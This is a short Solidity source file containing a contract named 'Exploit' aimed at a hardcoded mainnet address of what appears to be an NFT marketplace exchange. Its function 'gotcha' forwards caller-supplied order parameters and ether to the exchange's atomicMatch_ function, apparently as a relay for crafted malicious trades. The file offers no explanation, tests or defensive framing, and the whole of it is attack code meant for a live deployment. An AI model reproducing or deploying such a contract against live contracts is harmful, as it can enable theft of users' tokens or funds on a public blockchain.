// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface IWyverin {
    function atomicMatch_(
        address[14] calldata addrs,
        uint[18] calldata uints,
        uint8[8] calldata feeMethodsSidesKindsHowToCalls,
        bytes calldata calldataBuy,
        bytes calldata calldataSell,
        bytes calldata replacementPatternBuy,
        bytes calldata replacementPatternSell,
        bytes calldata staticExtradataBuy,
        bytes calldata staticExtradataSell,
        uint8[2] calldata vs,
        bytes32[5] calldata rssMetadata
    ) external payable;
}

contract Exploit {

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
  
    address private owner;
    IWyverin private wyverinContract ;
    
    constructor() {
        owner = msg.sender;
        wyverinContract = IWyverin(0x7f268357A8c2552623316e2562D90e642bB538E5); //mainnet
    }

    function gotcha(
        address[14] calldata addrs,
        uint[18] calldata uints,
        uint8[8] calldata feeMethodsSidesKindsHowToCalls,
        bytes memory calldataBuy,
        bytes memory calldataSell,
        bytes memory replacementPatternBuy,
        bytes memory replacementPatternSell,
        bytes memory staticExtradataBuy,
        bytes memory staticExtradataSell,
        uint8[2] memory vs,
        bytes32[5] calldata rssMetadata
    ) payable external {
        wyverinContract.atomicMatch_{
            value:msg.value
        }(
            addrs,
            uints, 
            feeMethodsSidesKindsHowToCalls, 
            calldataBuy, 
            calldataSell, 
            replacementPatternBuy, 
            replacementPatternSell, 
            staticExtradataBuy, 
            staticExtradataSell, 
            vs, 
            rssMetadata
        );
    }
}